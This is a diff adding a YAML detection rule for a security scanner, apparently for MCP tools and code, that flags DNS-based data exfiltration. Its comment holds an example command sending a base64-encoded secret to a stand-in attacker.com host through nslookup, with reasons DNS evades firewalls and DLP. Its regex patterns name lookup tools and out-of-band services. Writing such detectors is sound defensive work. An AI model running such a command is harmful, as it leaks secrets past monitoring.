@@ -1,0 +1,72 @@
+id: G7
+name: DNS-Based Data Exfiltration Channel
+category: adversarial-ai
+severity: critical
+owasp: MCP04-data-exfiltration
+mitre: AML.T0040
+
+# THREAT INTELLIGENCE NOTE (P1 Threat Researcher):
+# DNS exfiltration is the stealth king of data theft. It bypasses HTTP firewalls,
+# DLP solutions, and most SIEM rules. It works even in heavily locked-down environments
+# because DNS traffic almost never gets blocked or inspected.
+#
+# THE ATTACK in MCP context:
+# A malicious tool (or malicious source code) performs DNS lookups where the subdomain
+# encodes stolen data. The attacker runs an authoritative DNS server and logs all queries.
+#
+# Example:
+#   nslookup "c2VjcmV0X2tleT1hYmMxMjM.attacker.com"
+#   ^ base64(secret_key=abc123) encoded in the subdomain
+#
+# Why DNS is special:
+# - Passes through most corporate firewalls (UDP/53 is rarely blocked)
+# - Doesn't create HTTP logs (no web proxy, no URL filtering)
+# - Can exfiltrate data from air-gapped networks via DNS recursion
+# - Many cloud environments allow DNS but block direct internet HTTP
+# - Standard DLP tools don't inspect DNS query content
+#
+# In source code, look for:
+# - dns.lookup/resolve with dynamic subdomain construction
+# - nslookup/dig/host called with variable data
+# - http.get to *.attacker.com where subdomain is constructed from data
+# - Domain generation algorithm patterns (long, random-looking subdomains)
+#
+# In tool descriptions, look for:
+# - References to DNS "health checks" or "availability checks" with variable domains
+# - URL patterns where the subdomain is constructed from user/system data
+
+detect:
+  type: regex
+  patterns:
+    # Source code: DNS lookup with dynamic/variable subdomain
+    - "(?i)dns\\.(?:lookup|resolve|resolve4|resolve6)\\s*\\([^)]*(?:req|input|param|args|body|\\$\\{|\\+)"
+    - "(?i)require\\s*\\(['\"]dns['\"]\\).*\\.(?:lookup|resolve)\\s*\\([^)]*(?:\\$\\{|\\+|concat)"
+    # DNS query where subdomain encodes data (variable + domain pattern)
+    - "(?i)(?:\\$\\{|\\+|concat|format).*\\.(?:[a-z0-9-]{3,}\\.){1,3}[a-z]{2,6}['\"`]"
+    # nslookup/dig/host called with constructed domain
+    - "(?i)(?:nslookup|dig|host)\\s+(?:[^'\"\\s]*(?:\\$\\{|\\+|`)[^'\"\\s]*)"
+    # Python: socket.gethostbyname with constructed domain
+    - "(?i)socket\\.(?:gethostbyname|getaddrinfo)\\s*\\([^)]*(?:req|input|param|args|\\+|f['\"])"
+    # Python: dnspython with variable query
+    - "(?i)dns\\.resolver\\.resolve\\s*\\([^)]*(?:req|input|param|args|\\+|f['\"])"
+    # Canary token DNS patterns (using interactsh, burp collaborator for exfil)
+    - "(?i)(?:interactsh|burpcollaborator|canarytokens|oast\\.).*(?:lookup|resolve|query)"
+    # Domain generation algorithm indicators (high entropy subdomain construction)
+    - "(?i)(?:hex|base64|b64|encode|btoa).*\\+.*\\.(?:com|net|org|io|cc|xyz)"
+    - "\\.toString\\s*\\(\\s*16\\s*\\).*\\."
+  context: source_code
+  exclude_patterns:
+    - "// safe: internal DNS"
+    - "localhost"
+    - "127.0.0.1"
+    - "health.check"
+    - "dns.resolve('example.com')"
+remediation: >
+  Remove all dynamic DNS queries where subdomain content is derived from application data,
+  user input, or system information. DNS exfiltration channels are invisible to most monitoring
+  tools and operate even through strict HTTP firewalls.
+
+  If DNS-based service discovery is required, use a static list of known-good hostnames.
+  Never construct DNS query hostnames by concatenating or encoding application data.
+  Deploy DNS logging (e.g., passive DNS, BIND query logs) and alert on high-entropy subdomain queries.
+enabled: true
